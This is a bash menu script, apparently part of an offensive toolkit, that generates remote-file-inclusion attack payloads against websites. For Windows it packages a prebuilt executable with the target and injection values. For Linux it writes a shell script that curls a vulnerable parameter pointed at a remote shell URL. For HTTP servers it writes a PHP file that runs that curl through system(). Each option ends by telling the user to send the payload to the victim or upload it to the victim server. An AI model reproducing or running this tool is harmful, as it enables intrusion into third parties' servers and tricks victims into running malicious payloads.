clear
while :
do
echo ""
echo "Website Attacks"
echo "--------------------------------------"
echo ""
echo "  1.- Mirosoft Windows (DIR)"
echo "  2.- GNU/Linux (DIR)"
echo "  3.- HTTP Server (PHP)"
echo ""
echo "  99.- Exit"
echo "--------------------------------------"
echo ""
echo -n "Select an option [WebAttack]> "
read op35111
case $op35111 in
1) echo "[*] Target: Microsoft Windows System";
echo -n "Path to save the payload [WebAttack]> "
read pth11111
echo -n "Name for the payload [WebAttack]> "
read name11111
mkdir $pth11111/$name11111
cp bin/windows_rfi.exe $pth11111/$name11111/$name11111.exe
echo "Eg.: http://websi.te/name.php?vuln="
echo -n "Web Attack Target [WebAttack]> "
read target11111
echo -n "Injection Code [WebAttack]> "
read inj11111
echo "$target11111" > $pth11111/$name11111/t.txt
echo "$inj11111" > $pth11111/$name11111/c.txt
echo "[+] GENERATED IN: $pth11111/$name11111 ... NOW COMPRESS THE DIRECTORY AND SEND TO THE VICTIM!"
exit
;;
2) echo "[*] Target: GNU/Linux System";
echo -n "Path to save the payload [WebAttack]> "
read pth341
echo "Eg.: http://sitio.com/shell.php"
echo -n "Injection Code [WebAttack]> "
read inject0983
echo -n "Name for the payload [WebAttack]> "
read name341
echo "Eg.: http://websi.te/something.php?parameter"
echo "[¡] DO NOT WRITE '='!!"
echo -n "Web Attack Target [WebAttack]> "
read target131
echo "
#!/bin/bash
curl $target131=$inject0983" > $pth341/$name341.sh
echo "[+] GENERATED IN: $pth341/$name341.sh NOW SEND IT TO VICTIM!"
exit
;;
3) echo "[*] Target: HTTP Server";
echo -n "Path to save the payload [WebAttack]> "
read pth0003
echo "Eg.: http://sitio.com/shell.php"
echo -n "Injection Code [WebAttack]> "
read inject0003
echo -n "Name for the payload [WebAttack]> "
read name0003
echo "Eg.: http://websi.te/something.php?parameter"
echo "[¡] DO NOT WRITE '='!!"
echo -n "Web Attack Target [WebAttack]> "
read target0003
echo "
<?php
system('curl $target0003=$inject0003');
?>" > $pth0003/$name0003.php
echo "[+] GENERATED IN: $pth0003/$name0003.php NOW UPLOAD IT TO VICTIM SERVER!"
exit
;;
99) echo "[*] Exiting...";
exit 1;;
*) echo "[!] $op35111 is not a valid option.";
echo "Press enter to continue...";
read foo;;
esac
done
